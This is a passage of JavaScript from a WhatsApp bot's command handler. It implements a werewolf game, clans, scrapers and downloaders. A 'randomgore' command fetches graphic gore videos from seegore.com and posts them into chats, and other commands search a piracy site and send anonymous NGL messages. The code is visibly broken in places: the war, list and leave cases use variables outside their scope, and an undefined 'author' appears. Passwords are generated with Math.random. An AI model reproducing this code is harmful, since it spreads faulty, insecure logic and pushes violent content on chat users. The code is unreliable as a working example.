            m.chat, {
                text: exitww,
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: "",
                        mediaUrl: thumb,
                    },
                    mentionedJid: [sender],
                },
            }, {
                quoted: m
            }
        );
        playerExit(chat, sender, ww);
    } else if (value === "delete") {
        if (!ww[chat]) return replyphistar("No game sessions");
        if (ww[chat].owner !== sender)
            return replyphistar(`Only @${ww[chat].owner.split("@")[0]} can delete this game session`);
        replyphistar("Game session successfully deleted").then(() => {
            delete ww[chat];
        });
    } else if (value === "player") {
        if (!ww[chat]) return replyphistar("No game sessions");
        if (playerOnRoom(sender, chat, ww) === false)
            return replyphistar("You are not in a game session");
        if (ww[chat].player.length === 0)
            return replyphistar("Game session does not have any players yet");
        let player = [];
        let text = "\n*⌂ W E R E W O L F - G A M E*\n\nLIST PLAYER:\n";
        for (let i = 0; i < ww[chat].player.length; i++) {
            text += `(${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace("@s.whatsapp.net", "")} ${ww[chat].player[i].isdead === true ? `☠️ ${ww[chat].player[i].role}` : ""}\n`;
            player.push(ww[chat].player[i].id);
        }
        PhistarBotInc.sendMessage(
            m.chat, {
                text: text,
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: "",
                        mediaUrl: thumb,
                    },
                    mentionedJid: player,
                },
            }, {
                quoted: m
            }
        );
    } else {
        let text = `\n*⌂ W E R E W O L F - G A M E*\n\nA social game that takes place in several rounds. Players are required to find a criminal in the game. Players are given time, roles, and their respective abilities to play this game.\n\n*⌂ C O M M A N D*\n`;
        text += ` • ww create\n`;
        text += ` • ww join\n`;
        text += ` • ww start\n`;
        text += ` • ww exit\n`;
        text += ` • ww delete\n`;
        text += ` • ww player\n`;
        text += `\nThis game can be played by 5 to 15 people..`;
        PhistarBotInc.sendMessage(
            m.chat, {
                text: text.trim(),
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: "",
                        mediaUrl: thumb,
                    },
                },
            }, {
                quoted: m
            }
        );
    }
}
break;

case "clan":
case "clans": {
    if (!m.isGroup) return replyphistar(mess.OnlyGrup);
    let jimp = require("jimp");
    const resizeImage = async (image, width, height) => {
        const readImage = await jimp.read(image);
        const resizedImage = await readImage
            .resize(width, height)
            .getBufferAsync(jimp.MIME_JPEG);
        return resizedImage;
    };

    let thumbUrl = "https://telegra.ph/file/048d31385faac531d20c6.jpg";
    const {
        playerOnClan,
        readClans,
        writeClans,
        setMissions,
        upgradeMissonProgress,
        updateClanTaskProgress,
        upgradeClanLevel,
        simulateWinner,
        getClanData,
        saveClanData,
        saveTournamentData,
    } = require("./lib/clan");

    async function startNextMatch(tournament) {
        let nextMatch = tournament.matches.find(
            (match) => match.status === "pending",
        );
        if (!nextMatch) {
            tournament.status = "completed";
            clans.currentTournament = null;

            let winnerClan = tournament.participants[0];
            let winningClanData = await getClanData(winnerClan);

            winningClanData.power += 1000;
            winningClanData.level += 5;

            saveClanData(winnerClan, winningClanData);

            await replyphistar(
                `The tournament ${tournament.name} is over! The winner is ${winnerClan}. This clan receives 1000 power and advances 5 levels.`,
            );
            return;
        }

        let clan1Data = await getClanData(nextMatch.clan1);
        let clan2Data = await getClanData(nextMatch.clan2);

        nextMatch.status = "ongoing";
        writeClans(clans);

        let winner = simulateWinner(clan1Data, clan2Data);
        nextMatch.winner = winner;
        nextMatch.status = "completed";

        tournament.participants = tournament.participants.filter(
            (clan) =>
                clan !==
                (winner === clan1Data.clan ? clan2Data.clan : clan1Data.clan),
        );

        writeClans(clans);

        await replyphistar(
            `The match between ${clan1Data.clan} and ${clan2Data.clan} is over! The winner is ${winner}.`,
        );

        setTimeout(() => startNextMatch(tournament), 5000);
    }

    const { sender, chat } = m;
    const clans = readClans();
    const clanData = clans[chat];
    const action = args[0];
    const param1 = args[1];
    const param2 = args[2];

    switch (action) {
        case "create":
            let existingUserClan = Object.values(clans).find(
                (c) => c.owner === sender.replace("@s.whatsapp.net", ""),
            );
            if (existingUserClan) return replyphistar("You already have a clan.");
            let createText = `*Hooray, Clan created successfully*`;
            clans[param1] = {
                room: param1,
                owner: sender.replace("@s.whatsapp.net", ""),
                status: false,
                clan: param1,
                members: [],
                joinRequests: [],
                level: 1,
                warLimit: 5,
                currentWarCount: 0,
                missions: {
                    daily: {
                        description: "Recruit 5 new members",
                        progress: 0,
                        target: 5,
                        reward: 100,
                    },
                    weekly: {
                        description: "Win 3 wars",
                        progress: 0,
                        target: 3,
                        reward: 500,
                    },
                },
                clanTasks: {
                    description: "Reach level 3",
                    progress: 1,
                    target: 3,
                    reward: 300,
                },
            };
            createText += `\n\nTo join clans, please type .clan join your clan name.`;
            writeClans(clans);
            await replyphistar(createText.trim());
            break;

        case "join":
            if (!param1)
                return replyphistar(
                    "Please enter the name of the clan you want to join.",
                );

            let userClanCheck = Object.values(clans).find(
                (c) => c.members && c.members.some((m) => m.id === sender),
            );
            if (userClanCheck)
                return replyphistar("You are already part of another clan.");

            let targetJoinClan = Object.values(clans).find(
                (c) => c.clan === param1,
            );
            if (!targetJoinClan)
                return replyphistar("The clan you want to join was not found.");
            if (playerOnClan(sender, chat, clans) === true)
                return replyphistar("You are already part of this clan.");

            let joinData = {
                id: sender,
                number: targetJoinClan.members
                    ? targetJoinClan.members.length + 1
                    : 1,
                session: chat,
                status: false,
                clan: param1,
                vote: 0,
                isVote: false,
            };

            if (!targetJoinClan.joinRequests) {
                targetJoinClan.joinRequests = [];
            }

            targetJoinClan.joinRequests.push(joinData);
            writeClans(clans);

            let joinText = `Join request has been sent to clan ${targetJoinClan.clan}. Await approval from the clan leader.`;
            replyphistar(joinText);
            break;

        case "approve":
            if (!param1)
                return replyphistar(
                    "Please enter the name of the clan you want to view.",
                );
            let approveClan = Object.values(clans).find(
                (c) => c.clan === param1,
            );
            if (!approveClan) return replyphistar("Clan not found.");

            if (approveClan.owner !== sender.replace("@s.whatsapp.net", ""))
                return replyphistar(
                    "You do not have permission to approve join requests.",
                );

            if (
                !approveClan.joinRequests ||
                approveClan.joinRequests.length === 0
            )
                return replyphistar(
                    "There are no join requests pending approval.",
                );

            let approveText = "";

            if (param2 === "all") {
                let approvedMembers = [];
                approveClan.joinRequests.forEach((request) => {
                    approveClan.members.push({
                        id: request.id,
                        number: approveClan.members.length + 1,
                        sesi: chat,
                        status: false,
                        clan: request.clan,
                        vote: 0,
                    });
                    approvedMembers.push(request.id);
                    approveText += `Join request from @${request.id.replace("@s.whatsapp.net", "")} has been approved.\n`;
                });
                approveClan.joinRequests = [];
                writeClans(clans);
            } else if (param2) {
                let index = parseInt(param2) - 1;
                if (
                    isNaN(index) ||
                    index < 0 ||
                    index >= approveClan.joinRequests.length
                )
                    return replyphistar("Invalid index number.");

                let requester = approveClan.joinRequests[index];
                approveClan.joinRequests.splice(index, 1);
                approveClan.members.push({
                    id: requester.id,
                    number: approveClan.members.length + 1,
                    session: chat,
                    status: false,
                    clan: requester.clan,
                    vote: 0,
                });
                approveText = `Join request from @${requester.id.replace("@s.whatsapp.net", "")} has been approved.`;
                writeClans(clans);
            } else {
                let pendingRequestsText = `Please specify whether you want to approve all join requests (all) or a specific user's request.\n\n`;
                pendingRequestsText += "*List of Join Requests:*\n";
                approveClan.joinRequests.forEach((request, index) => {
                    pendingRequestsText += `${index + 1}. @${request.id.replace("@s.whatsapp.net", "")}\n`;
                });

                pendingRequestsText +=
                    "\nTo approve a specific request, use the command '.clan approve [index number]'";
                return replyphistar(pendingRequestsText.trim());
            }

            await replyphistar(approveText);
            break;
    }
}
break;
case "war": {
  let warInitiatorClan = Object.values(clans).find(
    (c) => c.owner === sender.replace("@s.whatsapp.net", ""),
  );
  if (!warInitiatorClan)
    return replyphistar("You do not have a clan to start a war.");

  if (warInitiatorClan.currentWarCount >= warInitiatorClan.warLimit)
    return replyphistar(
      `Your daily war limit has been reached (${warInitiatorClan.currentWarCount}/${warInitiatorClan.warLimit}).`,
    );

  let warTargetClan = Object.values(clans).filter(
    (c) => c.clan !== warInitiatorClan.clan,
  );
  if (warTargetClan.length === 0)
    return replyphistar(
      "No other clans found for war.",
    );

  warTargetClan =
    warTargetClan[Math.floor(Math.random() * warTargetClan.length)];

  if (warInitiatorClan.war || warTargetClan.war)
    return replyphistar(
      "One or both clans are currently in a state of war.",
    );

  let initiatorPower =
    warInitiatorClan.level * warInitiatorClan.members.length;
  let targetPower =
    warTargetClan.level * warTargetClan.members.length;
  let winnerClan =
    initiatorPower >= targetPower
      ? warInitiatorClan
      : warTargetClan;
  let loserClan =
    initiatorPower < targetPower ? warInitiatorClan : warTargetClan;
  let warReward = Math.floor(Math.random() * 3) + 1;

  winnerClan.level += 1; 
  winnerClan.warLimit += warReward;
  winnerClan.currentWarCount += 1;
  loserClan.currentWarCount += 1;

  if (winnerClan.missions && winnerClan.missions.daily) {
    if (
      winnerClan.missions.daily.description.includes("Reach level")
    ) {
      winnerClan.missions.daily.progress = winnerClan.level;
      if (
        winnerClan.missions.daily.progress >=
        winnerClan.missions.daily.target
      ) {
        winnerClan.warLimit += winnerClan.missions.daily.reward;
        winnerClan.missions.daily.completed = true;
      }
    }
  }

  if (winnerClan.missions && winnerClan.missions.weekly) {
    if (
      winnerClan.missions.weekly.description.includes("Reach level")
    ) {
      winnerClan.missions.weekly.progress = winnerClan.level;
      if (
        winnerClan.missions.weekly.progress >=
        winnerClan.missions.weekly.target
      ) {
        winnerClan.warLimit += winnerClan.missions.weekly.reward;
        winnerClan.missions.weekly.completed = true;
      }
    }
  }

  let warResultText = `*War Result:*\n\n`;
  warResultText += `Winner: ${winnerClan.clan} (Level ${winnerClan.level})\n`;
  warResultText += `Loser: ${loserClan.clan} (Level ${loserClan.level})\n`;
  warResultText += `Clan ${winnerClan.clan} receives an additional war limit reward of ${warReward}.\n\n`;
  warResultText += `Daily war count for ${warInitiatorClan.clan}: ${warInitiatorClan.currentWarCount}/${warInitiatorClan.warLimit}`;
  writeClans(clans);
  await replyphistar(warResultText.trim());
  break;
}

case "list": {
  let listText = `*List of Clans:*\n\n`;
  for (let clanKey in clans) {
    if (
      clanKey === "tournaments" ||
      clanKey === "currentTournament"
    )
      continue;

    let clan = clans[clanKey];
    if (clan && clan.members) {
      let warLimitDisplay =
        clan.warLimit !== null && clan.warLimit !== undefined
          ? clan.warLimit
          : 3;
      listText += `Clan Name: ${clan.clan}\n`;
      listText += `Level: ${clan.level}\n`;
      listText += `Number of Members: ${clan.members.length}\n`;
      listText += `Daily War Limit: ${clan.currentWarCount}/${warLimitDisplay}\n\n`;
    }
  }
  await replyphistar(listText.trim());
  break;
}

case "leave": {
  let userClan = Object.values(clans).find(
    (c) => c.members && c.members.some((m) => m.id === sender),
  );
  if (!userClan)
    return replyphistar("You are not part of any clan.");

  userClan.members = userClan.members.filter(
    (m) => m.id !== sender,
  );
  writeClans(clans);
  await replyphistar(`You have left the clan ${userClan.clan}.`);
  break;
}

case 'password': {
  const length = parseInt(args[0]) || 12;
  const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+~`|}{[]:;?><,./-=";
  let password = "";
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * charset.length);
    password += charset[randomIndex];
  }
  replyphistar(`*Generated Password:* ${password}`);
  break;
}

case 'mood': {
  const currentHour = new Date().getHours();
  let mood = '';

  if (currentHour < 6) {
    mood = 'Sleepy 😴';
  } else if (currentHour < 12) {
    mood = 'Energetic ☀️';
  } else if (currentHour < 18) {
    mood = 'Productive 💼';
  } else {
    mood = 'Relaxed 🌙';
  }

  replyphistar(`Your mood is: ${mood}`);
  break;
}

case 'webtoon': {
  async function webtoons(query) {
    return new Promise((resolve, reject) => {
      axios.get(`https://www.webtoons.com/id/search?keyword=${query}`)
        .then(({
          data
        }) => {
          const $ = cheerio.load(data);
          const hasil = [];
          $('#content > div.card_wrap.search._searchResult > ul > li ').each(function(a, b) {
            result = {
              status: 200,
              author: author,
              Title: $(b).find('> a > div > p.subj').text(),
              like: $(b).find('> a > div > p.grade_area > em').text(),
              creator: $(b).find('> a > div > p.author').text(),
              genre: $(b).find('> a > span').text(),
              thumbnail: $(b).find('> a > img').attr('src'),
              url: $(b).find('> a').attr('href')
            };
            hasil.push(result);
          });
          resolve(hasil);
        })
        .catch(reject);
    });
  }
  if (!text) return replyphistar('Enter the title you want to search for!!\nExample: .webtoon lookism');
  let results = await webtoons(text);
  if (results.length > 0) {
    let message = `Results of the search ${text} :\n\n`;
    results.forEach((result, index) => {
      message += `Title : ${result.Title}\nLike : ${result.like}\nCreator : ${result.creator}\nGenre : ${result.genre}\nLink Baca : ${result.url}\n\n`;
    });
    replyphistar(message);
  } else {
    replyphistar('No result.');
  }
}
break;

case 'lk21': {
  const query = m.body.slice(5).trim();
  if (!query) {
    return replyphistar("Please enter the title of the movie you want to search for..");
  }
  async function avzzzz(query) {
    try {
      const response = await axios.get(`https://tv.lk21official.my/search.php?s=${query}`);
      const html = response.data;
      const $ = cheerio.load(html);
      let results = [];
      $('.search-item').each((index, element) => {
        const title = $(element).find('h3 a').text().trim();
        const url = 'https://tv.lk21official.my' + $(element).find('h3 a').attr('href');
        const director = $(element).find('p strong:contains("Sutradara:")').parent().text().replace("Sutradara:", "").trim();
        const cast = $(element).find('p strong:contains("Bintang:")').parent().text().replace("Bintang:", "").trim();
        results.push({
          title,
          url,
          director,
          cast
        });
      });
      return results;
    } catch (error) {
      console.error(error);
      return [];
    }
  }
  const results = await avzzzz(query);
  if (results.length === 0) {
    return replyphistar("No results found for your search: " + query);
  }
  let message = "Search results for: *" + query + "*\n\n";
  results.forEach((result) => {
    message += `Title: ${result.title}\n`;
    if (result.director) {
      message += `Director: ${result.director}\n`;
    }
    if (result.cast) {
      message += `Bintang: ${result.cast}\n`;
    }
    message += `Url: ${result.url}\n\n`;
  });
  replyphistar(message);
}
break;
case 'cita-cita': {
  let res = await fetch(
    "https://raw.githubusercontent.com/BadXyz/txt/main/citacita/citacita.json",
  );
  let json = await res.json();
  let ngawi = pickRandom(json);
  // Assuming fsizedoc is supposed to be a variable with the desired value
  let fsizedoc = 10; // Replace 10 with the actual value you want

  await PhistarBotInc.sendMessage(
    m.chat,
    {
      audio: { url: ngawi },
      seconds: fsizedoc,
      ptt: true,
      mimetype: "audio/mpeg",
      fileName: "vn.mp3",
      waveform: [100, 0, 100, 0, 100, 0, 100],
    },
    { quoted: m },
  );
}
break;

case 'ngl': {
  if (!text || !text.includes('|')) {
    return replyphistar(`*Usage:* .ngl <username>|<message>\n\n*Example:* .ngl phistar11|Hello there!`);
  }

  try {
    // Parse the username and message
    const [username, message] = text.split('|').map(t => t.trim());

    if (!username || !message) {
      return replyphistar(`*Usage:* .ngl <username>|<message>\n\n*Example:* .ngl phistar11|Hello there!`);
    }

    // Construct the NGL link using the username
    const nglLink = `https://ngl.link/${username}`;

    // Call the NGL API
    const apiResponse = await axios.get(`https://api.siputzx.my.id/api/tools/ngl`, {
      params: { link: nglLink, text: message }
    });

    // Check API response
    if (apiResponse.status === 200 && apiResponse.data.status) {
      replyphistar(`✅ *Message Sent Successfully!*\n\n📩 Message: "${message}"\n🔗 NGL Username: ${username}`);
    } else {
      replyphistar(`❌ *Failed to send the message.* Please try again.`);
    }
  } catch (error) {
    console.error('Error in NGL command:', error);
    replyphistar(`*AN ERROR OCCURRED!! MESSAGE :*\n\n> ${error.message}`);
  }
}
break;

case 'wattpad': {
  async function WattPad(judul) {
    return new Promise(async (resolve, reject) => {
      try {
        const { data } = await axios.get('https://www.wattpad.com/search/' + judul, {
          headers: {
            cookie: 'wp_id=d92aecaa-7822-4f56-b189-f8c4cc32825c; sn__time=j%3Anull; fs__exp=1; adMetrics=0; _pbkvid05_=0; _pbeb_=0; _nrta50_=0; lang=20; locale=id_ID; ff=1; dpr=1; tz=-8; te_session_id=1681636962513; _ga_FNDTZ0MZDQ=GS1.1.1681636962.1.1.1681637905.0.0.0; _ga=GA1.1.1642362362.1681636963; signupFrom=search; g_state={"i_p":1681644176441,"i_l":1}; RT=r=https%3A%2F%2Fwww.wattpad.com%2Fsearch%2Fanime&ul=1681637915624',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0'
          }
        });
        const $ = cheerio.load(data);
        const limk = 'https://www.wattpad.com';
        const _data = [];
        $('.story-card-container > ul.list-group.new-list-group > li.list-group-item').each(function (i, u) {
          let link = limk + $(u).find('a').attr('href');
          let judul = $(u).find('a > div > div.story-info > div.title').text().trim();
          let img = $(u).find('a > div > div.cover > img').attr('src');
          let desc = $(u).find('a > div > div.story-info > .description').text().replace(/\s+/g, ' ');
          let _doto = [];
          $(u).find('a > div > div.story-info > .new-story-stats > .stats-item').each((u, i) => {
            _doto.push($(i).find('.icon-container > .tool-tip > .sr-only').text());
          });
          _data.push({
            title: judul,
            thumb: img,
            desc: desc,
            reads: _doto[0],
            vote: _doto[1],
            chapter: _doto[2],
            link: link,
          });
        });
        resolve(_data);
      } catch (err) {
        console.error(err);
      }
    });
  }
  if (!text) return replyphistar('Enter the title you want to search for!!\nExample: .wattpad matchmaking');
  let results = await WattPad(text);
  if (results.length > 0) {
    let message = `Results of the search ${text} :\n\n`;
    results.forEach((result, index) => {
      message += `Title : ${result.title}\nChapter : ${result.chapter}\nVote : ${result.vote}\nTotal Reader : ${result.reads}\nDesc : ${result.desc}\nLink Baca : ${result.link}\n\n`;
    });
    PhistarBotInc.sendMessage(m.chat, { image: { url: results[0].thumb }, caption: message }, { quoted: m });
  } else {
    replyphistar('No result.');
  }
}
break;

case 'tts': {
  const argsSplit = text.split("|");
  const ttsText = argsSplit[0]?.trim();
  const voiceIndex = parseInt(argsSplit[1]?.trim());

  if (!ttsText) {
    return replyphistar(`*Example:* ${prefix + command} I love Big Daddy | 7`);
  }

  // Hardcoded voice list
  const voices = [
    "Filiz", "Astrid", "Tatyana", "Maxim", "Carmen", "Ines", "Cristiano", "Vitoria", "Ricardo", "Maja",
    "Jan", "Jacek", "Ewa", "Ruben", "Lotte", "Liv", "Seoyeon", "Takumi", "Mizuki", "Giorgio",
    "Carla", "Bianca", "Karl", "Dora", "Mathieu", "Celine", "Chantal", "Penelope", "Miguel", "Mia",
    "Enrique", "Conchita", "Geraint", "Salli", "Matthew", "Kimberly", "Kendra", "Justin", "Joey", "Joanna",
    "Ivy", "Raveena", "Aditi", "Emma", "Brian", "Amy", "Russell", "Nicole", "Vicki", "Marlene",
    "Hans", "Naja", "Mads", "Gwyneth", "Zhiyu", "Tracy", "Danny", "Huihui", "Yaoyao", "Kangkang",
    "HanHan", "Zhiwei", "Asaf", "An", "Stefanos", "Filip", "Ivan", "Heidi", "Herena", "Kalpana",
    "Hemant", "Matej", "Andika", "Rizwan", "Lado", "Valluvar", "Linda", "Heather", "Sean", "Michael"
  ];

  // If no or invalid number, return full list
  if (!voiceIndex || isNaN(voiceIndex) || voiceIndex < 1 || voiceIndex > voices.length) {
    let listText = `*🔊 Available TTS Voices (Total: ${voices.length}):*\n\n`;
    voices.forEach((v, i) => {
      listText += `${i + 1}. ${v}\n`;
    });
    listText += `\n_Use like:_\n${prefix + command} Your text here | VoiceNumber`;
    return replyphistar(listText);
  }

  const selectedVoice = voices[voiceIndex - 1];
  await PhistarBotInc.sendMessage(m.chat, { react: { text: `🎤`, key: m.key } });

  try {
    const api = `https://api.paxsenix.biz.id/tools/tts?text=${encodeURIComponent(ttsText)}&voice=${encodeURIComponent(selectedVoice)}`;
    const res = await axios.get(api);

    if (!res.data.ok || !res.data.directUrl) {
      return replyphistar(`❌ Failed to generate voice. Try a different number.`);
    }

    await PhistarBotInc.sendMessage(m.chat, {
      audio: { url: res.data.directUrl },
      mimetype: 'audio/mp4',
      fileName: `voice-${voiceIndex}.mp3`,
      ptt: false
    }, { quoted: m });

    await PhistarBotInc.sendMessage(m.chat, { react: { text: `✅`, key: m.key } });

  } catch (e) {
    console.error("TTS Error:", e);
    replyphistar(`❌ Error: ${e.message}`);
  }
}
break;

case 'brat': {
  if (!text) return replyphistar(`*Example:* ${prefix + command} Big Daddy`);

  await PhistarBotInc.sendMessage(m.chat, { react: { text: `🖼️`, key: m.key } });

  try {
    const res = await axios.get(`https://api.paxsenix.biz.id/maker/brat?text=${encodeURIComponent(text)}`);
    if (!res.data.ok || !res.data.url) return replyphistar(`❌ Failed to create brat image.`);

    await PhistarBotInc.sendMessage(m.chat, {
      image: { url: res.data.url },
      caption: `\n\n> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴘʜɪsᴛᴀʀ`
    }, { quoted: m });

    await PhistarBotInc.sendMessage(m.chat, { react: { text: `✅`, key: m.key } });

  } catch (err) {
    console.error("Brat Image Error:", err);
    replyphistar(`❌ Error: ${err.message}`);
  }
}
break;

case 'bratvid': {
  if (!text) return replyphistar(`*Example:* ${prefix + command} Phistar Tech`);

  await PhistarBotInc.sendMessage(m.chat, { react: { text: `🎥`, key: m.key } });

  try {
    const res = await axios.get(`https://api.paxsenix.biz.id/maker/bratvid?text=${encodeURIComponent(text)}`);
    if (!res.data.ok || !res.data.url) return replyphistar(`❌ Failed to create brat video.`);

    await PhistarBotInc.sendMessage(m.chat, {
      video: { url: res.data.url },
      caption: `\n\n> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴘʜɪsᴛᴀʀ`
    }, { quoted: m });

    await PhistarBotInc.sendMessage(m.chat, { react: { text: `✅`, key: m.key } });

  } catch (err) {
    console.error("BratVid Error:", err);
    replyphistar(`❌ Error: ${err.message}`);
  }
}
break;

case 'randomgore': {
  function gore() {
    return new Promise((resolve, reject) => {
      const page = Math.floor(Math.random() * 228);
      axios.get('https://seegore.com/gore/page/' + page)
        .then((res) => {
          const $ = cheerio.load(res.data);
          const link = [];
          $('ul > li > article').each(function(a, b) {
            link.push({
              title: $(b).find('div.content > header > h2').text(),
              link: $(b).find('div.post-thumbnail > a').attr('href'),
              thumb: $(b).find('div.post-thumbnail > a > div > img').attr('src'),
              view: $(b).find('div.post-thumbnail > div.post-meta.bb-post-meta.post-meta-bg > span.post-meta-item.post-views').text(),
              vote: $(b).find('div.post-thumbnail > div.post-meta.bb-post-meta.post-meta-bg > span.post-meta-item.post-votes').text(),
              tag: $(b).find('div.content > header > div > div.bb-cat-links').text(),
              comment: $(b).find('div.content > header > div > div.post-meta.bb-post-meta > a').text()
            });
          });
          const random = link[Math.floor(Math.random() * link.length)];
          axios.get(random.link)
            .then((resu) => {
              const $$ = cheerio.load(resu.data);
              const hasel = {};
              hasel.title = random.title;
              hasel.source = random.link;
              hasel.thumb = random.thumb;
              hasel.tag = $$('div.site-main > div > header > div > div > p').text();
              hasel.upload = $$('div.site-main').find('span.auth-posted-on > time:nth-child(2)').text();
              hasel.author = $$('div.site-main').find('span.auth-name.mf-hide > a').text();
              hasel.comment = random.comment;
              hasel.vote = random.vote;
              hasel.view = $$('div.site-main').find('span.post-meta-item.post-views.s-post-views.size-lg > span.count').text();
              hasel.video1 = $$('div.site-main').find('video > source').attr('src');
              hasel.video2 = $$('div.site-main').find('video > a').attr('href');
              resolve(hasel);
            });
        });
    });
  }
  let letme = await gore();
  let hiy = `[ *RANDOM GORE* ]

Title: ${letme.title}
Source: ${letme.source}
Tag: ${letme.tag}
Upload: ${letme.upload}
Author: ${letme.author}
Comment: ${letme.comment}
Vote: ${letme.vote}
Views: ${letme.view}
`;
  await PhistarBotInc.sendMessage(m.chat, { video: { url: letme.video1 }, caption: hiy }, { quoted: m });
}
break;

case 'tt3': {
  let input = `[!] *wrong input*
	
Ex : ${prefix + command} https://vt.tiktok.com/ZSFSqcuXb/`;

  if (!text) return replyphistar(input);

  if (!(text.includes('http://') || text.includes('https://'))) return replyphistar(`url invalid, please input a valid url. Try with add http:// or https://`);
  if (!text.includes('tiktok.com')) return replyphistar(`Invalid Tiktok URL.`);
  async function tiktok(url) {
    return new Promise(async (resolve, reject) => {
      const msc = await axios({
        url: "https://musicaldown.com/id",
        method: "GET",
        headers: {
          'user-agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
        }
      });
      const a = cheerio.load(msc.data);
      let FORM = {
        [`${a("#link_url").attr("name")}`]: url,
        [`${a("#submit-form > div").find("div:nth-child(1) > input[type=hidden]:nth-child(2)").attr("name")}`]: a("#submit-form > div").find("div:nth-child(1) > input[type=hidden]:nth-child(2)").attr("value"),
        verify: a("#submit-form > div").find("div:nth-child(1) > input[type=hidden]:nth-child(3)").attr("value")
      };
      const getPost = await axios({
        url: "https://musicaldown.com/id/download",
        method: "POST",
        headers: {
          'user-agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
          "cookie": msc.headers["set-cookie"].join("")
        },
        data: new URLSearchParams(Object.entries(FORM))
      });

      const postmp3 = await axios({
        url: "https://musicaldown.com/id/mp3",
        method: "POST",
        headers: {
          'user-agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
          "cookie": msc.headers["set-cookie"].join("")
        },
        data: new URLSearchParams(Object.entries(getPost))
      });

      const w = cheerio.load(getPost.data);
      const x = cheerio.load(postmp3.data);
      const FormatPost = {
        nowm: w("body > div.welcome.section > div").find("div.col.s12.l8 > a").eq(2).attr("href"),
        audio: x("a.btn.waves-effect.waves-light.orange").eq(2).attr("href")
      };
      return resolve(FormatPost);
    });
  }
  let tiktik = await tiktok(text);
  await PhistarBotInc.sendMessage(m.chat, { video: { url: tiktik.nowm }, caption: mess.success }, { quoted: m });
  await PhistarBotInc.sendMessage(m.chat, { audio: { url: tiktik.audio }, mimetype: "audio/mp4", ptt: true }, { quoted: m });
}
break;

case 'aio2': {
  if (!text) return replyphistar(`Example: ${prefix + command} link`);
  async function aio(url) {
    return new Promise(async (resolve, reject) => {
      const { data: rest } = await axios.get("https://steptodown.com/");
      const $ = cheerio.load(rest);
      const tokens = $("input[name='token']").val();
      const data = new URLSearchParams(
        Object.entries({
          url: url,
          token: tokens
        })
      );
      await axios.post("https://steptodown.com/wp-json/aio-dl/video-data/", data, {
        headers: {
          "cookie": "PHPSESSID=658754a80bacc095aced0be8e110f3b4; pll_language=en",
          "user-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
        }
      })
        .then((response) => {
          resolve(response.data);
        })
        .catch((e) => {
          reject(e);
        });
    });
  }
  let sonice = await aio(text);
  let wpol = `[ *AIO DOWNLOADER* ]

${sonice.title}

Duration: ${sonice.duration}
Source: ${sonice.source}
Size: ${sonice.medias[0].formattedSize} || ${sonice.medias[0].size}
Quality: ${sonice.medias[0].quality}
MimeType: ${sonice.medias[0].extension}
`;
  await PhistarBotInc.sendMessage(m.chat, { video: { url: sonice.medias[0].url }, caption: wpol }, { quoted: m });
}
break;

case 'quotess': {
  async function quotes(input) {
    return new Promise((resolve, reject) => {
      fetch('https://jagokata.com/kata-bijak/kata-' + input.replace(/\s/g, '_') + '.html?page=1')
        .then(res => res.text())
        .then(res => {
          const $ = cheerio.load(res);
          let data = [];
          $('div[id="main"]').find('ul[id="citatenrijen"] > li').each(function (index, element) {
            let x = $(this).find('div[class="citatenlijst-auteur"] > a').text().trim();
            let y = $(this).find('span[class="auteur-beschrijving"]').text().trim();
            let z = $(element).find('q[class="fbquote"]').text().trim();
            data.push({ author: x, bio: y, quote: z });
          });
          data.splice(2, 1);
          if (data.length == 0) return resolve({ creator: '@neoxr - Wildan Izzudin & @ariffb.id - Ariffb', status: false });
          resolve({ creator: '@neoxr - Wildan Izzudin & @ariffb.id - Ariffb', status: true, data });
        }).catch(reject);
    });
  }
  if (!text) return replyphistar("Enter Quotes Type\n\nExample: .quotess senja");
  let ayam = await quotes(text);
  let jawir = ayam.data;
  let ngawi = pickRandom(jawir);
  let cap = `  
_${ngawi.quote}_

~ ${ngawi.author}
`.trim();
  replyphistar(cap);
}
break;

case 'quotesanime': {
  async function quotesAnime() {
    try {
      const page = Math.floor(Math.random() * 184);
      const { data } = await axios.get('https://otakotaku.com/quote/feed/' + page);
      const $ = cheerio.load(data);
      const hasil = [];
      $('div.kotodama-list').each((l, h) => {
        hasil.push({
          link: $(h).find('a').attr('href'),
          gambar: $(h).find('img').attr('data-src'),
          karakter: $(h).find('div.char-name').text().trim(),
          anime: $(h).find('div.anime-title').text().trim(),
          episode: $(h).find('div.meta').text(),
          up_at: $(h).find('small.meta').text(),
          quotes: $(h).find('div.quote').text().trim()
        });
      });
      return hasil;
    } catch (error) {
      throw error;
    }
  }
  quotesAnime().then(hasil => {
    if (hasil.length === 0) {
      replyphistar('Tidak ada hasil yang ditemukan.');
      return;
    }
    let replyTextt = `[ *QUOTES_ANIME* ]\n\n`;
    hasil.forEach((hasil) => {
      replyTextt += `Quotes: ${hasil.quotes}\nAnime: ${hasil.anime}\nEpisode: ${hasil.episode}\nUp: ${hasil.up_at}\nCharacter: ${hasil.karakter}\nLink${hasil.link}\n\n`;
    });
    replyphistar(replyTextt);
  }).catch(error => {
    replyphistar('Terjadi kesalahan saat merandom di QuotesAnime.');
    replyphistar(error.message);
  });
}
